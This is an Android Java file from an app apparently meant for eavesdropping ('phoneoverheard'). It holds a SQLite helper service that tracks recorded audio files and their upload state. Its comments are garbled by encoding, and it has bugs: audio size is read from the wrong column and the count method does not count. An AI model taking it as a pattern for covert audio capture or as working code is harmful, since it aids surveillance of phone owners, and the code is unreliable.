package com.phoneoverheard.database;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.IBinder;

@SuppressLint("SimpleDateFormat")
public class SendaudioService extends Service {
    @SuppressWarnings("unused")
	private static final String TAG = "sendaudioService";   
    private DatabaseHelper SendaudioDatabasehelper; 
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	String receiveTime = Dateformat.format(date);
	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}
	
	public SendaudioService(Context context){
		this.SendaudioDatabasehelper = new DatabaseHelper(context);
	}


	public  void close() {
		if (SendaudioDatabasehelper != null) {
			SendaudioDatabasehelper.close();
		}
	}
	
	@Override
	public void onDestroy() {
		super.onDestroy();
		if (SendaudioDatabasehelper != null) {
			SendaudioDatabasehelper.close();
		}
	}
	
	/**
     *����Ƶ���ͱ��в�������
     * @param sendaudio 
     * @return ��           
     */
    public void insert (Sendaudio sendaudio){ 
    	SQLiteDatabase db = SendaudioDatabasehelper.getWritableDatabase();
    	db.execSQL("insert into sendaudio(sendstate,audiosize,datetime,audiourl,audioname) values(?,?,?,?,?)",
    			new Object[]{ sendaudio.getSendstate(),sendaudio.getAudiosize(),sendaudio.getDatetime(),sendaudio.getAudiourl(),sendaudio.getAudioname()});
    	db.close();
    	close();
    	onDestroy();
    }
    
	/**
     *����Ƶ���ͱ���ɾ������
     * @param smskey 
     * @return ��
     */
    public void delete (int sendstate){ 
    	SQLiteDatabase db = SendaudioDatabasehelper.getWritableDatabase();
    	db.execSQL("delete from sendaudio where sendstate=?", new Object[]{sendstate});
    	db.close();
    	close();
    	onDestroy();
    }
    
	/**
     *�޸���Ƶ���ͱ�������
     * @param sendaudio 
     * @return ��
     */
    public void update (String audioname,int sendstate){ 
    	SQLiteDatabase db = SendaudioDatabasehelper.getWritableDatabase();
    	db.execSQL("update sendaudio set sendstate=? where audioname=?",
    			new Object[]{sendstate,audioname});
    	db.close();
    	close();
    	onDestroy();
    }

	/**
     *������Ƶ���ͱ���ĳ�� ����
     * @param sendaudio 
     * @return ��     
     */
    public  List<Sendaudio>  find (int sendstate){ 
    	List<Sendaudio> sendaudio = new ArrayList<Sendaudio>();
    	SQLiteDatabase db = SendaudioDatabasehelper.getReadableDatabase();
    	Cursor sendaudioCursor = db.rawQuery("select * from sendaudio where sendstate=?", new String[]{sendstate+""});
    	while(sendaudioCursor.moveToNext()){
    		int audiosize = sendaudioCursor.getInt(sendaudioCursor.getColumnIndex("sendstate"));
    		String datetime = sendaudioCursor.getString(sendaudioCursor.getColumnIndex("datetime"));
    		String audiourl = sendaudioCursor.getString(sendaudioCursor.getColumnIndex("audiourl"));
    		String audioname = sendaudioCursor.getString(sendaudioCursor.getColumnIndex("audioname"));
    		sendaudio.add(new Sendaudio(sendstate,audiosize,datetime,audiourl,audioname));
    	}
    	if(sendaudioCursor != null){
    		sendaudioCursor.close();
    	}
    	db.close();
    	close();
    	onDestroy();
		return sendaudio;
    }
    
	/**
     *��ѯ��Ƶ���ͱ��м�¼����
     * @param ��
     * @return result ��¼����
     */
    public Long getCount (int sendstate){ 
    	SQLiteDatabase db = SendaudioDatabasehelper.getReadableDatabase();
    	Cursor sendaudioCursor = db.rawQuery("select * from sendaudio where sendstate=?", new String[]{sendstate+""});
    	sendaudioCursor.moveToFirst();
    	long result = sendaudioCursor.getLong(0);
    	if(sendaudioCursor != null){
    		sendaudioCursor.close();
    	}
    	db.close();
    	close();
    	onDestroy();
		return result;
    }
}
